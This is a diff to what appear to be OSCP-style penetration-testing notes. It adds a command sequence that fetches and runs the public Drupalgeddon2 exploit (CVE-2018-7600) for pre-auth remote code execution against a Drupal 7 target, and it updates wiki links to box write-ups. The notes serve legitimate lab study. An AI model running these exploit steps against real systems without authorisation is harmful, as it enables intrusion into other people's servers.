@@ -106,6 +106,17 @@ curl -s http://$BoxIP/CHANGELOG.txt | grep -m1 "Drupal"
 # Version on Drupal 8+
 curl -s http://$BoxIP/core/CHANGELOG.txt | grep -m1 "Drupal"
 
+# Drupal 7 pre-auth RCE: CVE-2018-7600 / Drupalgeddon2
+searchsploit "Drupal 7"
+searchsploit -x php/webapps/44449.rb
+boxset ExploitFile "$BoxDir/exploits/44449.rb"
+cp /usr/share/exploitdb/exploits/php/webapps/44449.rb "$ExploitFile"
+# Only remove the optional HighLine dependency when the local Ruby environment lacks it
+sed -i "/require 'highline\/import'/d" "$ExploitFile"
+sed -i 's/try_phpshell = true/try_phpshell = false/' "$ExploitFile"
+ruby -c "$ExploitFile"
+ruby "$ExploitFile" "http://$BoxIP/"
+
 # Admin-to-RCE: PHP Filter module (Drupal 7 only, disabled by default)
 # Extend → find PHP Filter → Enable
 # Content → Add Content → Basic page → set Text Format to "PHP code"
@@ -280,7 +291,7 @@ searchsploit -m 50057.py
 python3 50057.py
 ```
 
-See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.13]], [[Arctic|Arctic box writeup]] (same ColdFusion 8 CVE).
+See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.13]], [[OSCP/BOXES/MASTER BOX LIST|Arctic box writeup]] (same ColdFusion 8 CVE).
 
 #### Tags: #ColdFusion #ColdFusionRCE #CVE20092265
 
@@ -514,11 +525,12 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 ## Related Modules
 
-- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+- [[OSCP/MODULES/06. Information Gathering]] -- module concepts used by this hub page
 
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- Drupal 7.54 version disclosure and CVE-2018-7600 command execution
 
 ## Fermion application note: Jenkins Script Console
 
